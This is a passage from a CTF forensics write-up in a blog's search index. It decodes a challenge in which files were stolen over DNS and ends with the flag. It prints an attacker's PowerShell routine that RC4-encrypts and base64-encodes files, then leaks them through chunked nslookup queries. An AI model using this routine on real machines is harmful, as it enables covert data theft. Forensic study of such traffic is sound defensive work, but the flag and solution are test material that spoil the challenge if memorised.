[System.Text.Encoding]::ASCII; </span><br><span class="line">    $p = $Enc.GetBytes(&#x27;[System.IO.File]::ReadAllBytes($_.FullName)&#x27;); </span><br><span class="line">    $z = $Enc.GetBytes([System.IO.File]::ReadAllBytes($_.FullName)); </span><br><span class="line">    $u = (&amp; $R $z $p); </span><br><span class="line">    $e = [System.Convert]::ToBase64String($u); </span><br><span class="line">    $l=$e.Length; </span><br><span class="line">    $r=&quot;&quot;; </span><br><span class="line">    $n=0; </span><br><span class="line">    while ($n -le ($l/$b)) &#123; </span><br><span class="line">        $c=$b; </span><br><span class="line">        if (($n*$b)+$c -gt $l) &#123; </span><br><span class="line">            $c=$l-($n*$b) </span><br><span class="line">        &#125;; </span><br><span class="line">        $r+=$e.Substring($n*$b, $c) + &quot;.&quot;; </span><br><span class="line">        if (($n%$s) -eq ($s-1)) &#123; </span><br><span class="line">            nslookup -type=A $r$a. $d; $r=&quot;&quot; </span><br><span class="line">        &#125; </span><br><span class="line">        $n=$n+1 </span><br><span class="line">    &#125; </span><br><span class="line">    nslookup -type=A $r$a. $d </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It can be observed that his essence is base64+rc4+ splitting</p>
<p>Made a cyberchef decryption: </p>
<p><a href="https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)RC4">https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)RC4</a>(%7B’option’: ‘UTF8’,’string’:’%5BSystem.IO.File%5D::ReadAllBytes($_.FullName)’%7D,’Latin1’,’Latin1’)From_Decimal(‘Space’,false)</p>
<h3 id="Decrypt-DNS-packets"><a href="#Decrypt-DNS-packets" class="headerlink" title="Decrypt DNS packets:"></a>Decrypt DNS packets:</h3><p><img src="https://i.imgur.com/bwvUSKI.png"></p>
<p><code>tshark -r HiddenGem.pcapng -T fields -e dns.resp.name | sed &#39;/^\s*$/d&#39; &gt; 1.txt</code></p>
<p>First extract all of them into 1.txt. It can be seen that the form of dns traffic is to encrypt the data above and then separate every 57 characters with “.”, with three paragraphs per line and add the base64 of the file name at the end encoding, so with a simple extraction, all the filenames are known</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">des.txt</span><br><span class="line">KCSC.jpg</span><br><span class="line">SecretPlan.pdf</span><br><span class="line">update.ps1</span><br><span class="line">zoneblue.jpg</span><br></pre></td></tr></table></figure>

<p>The most suspicious one is SecretPlan.pdf, so you can manually extract it and remove the data other than the file data, and then decrypt it in the cyberchef link above.</p>
<p><img src="https://i.imgur.com/rSDM5Hg.png"></p>
<p>To get the url <a href="https://pastebin.com/xCmXLGUq">https://pastebin.com/xCmXLGUq</a>, access to get the flag<br>–&gt; <code>idek&#123;RDP_Cache_1s_g0OD_bu7_1_h4t3_t4K1n9_t3x7_fr0M_Im4g3s&#125;</code></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Misc</tag>
        <tag>CTF</tag>
        <tag>Forensics</tag>
        <tag>Windows</tag>
        <tag>BMC-Cache</tag>
        <tag>PowerShell</tag>
        <tag>EVTX Log Anaylsis</tag>
      </tags>
  </entry>
</search>
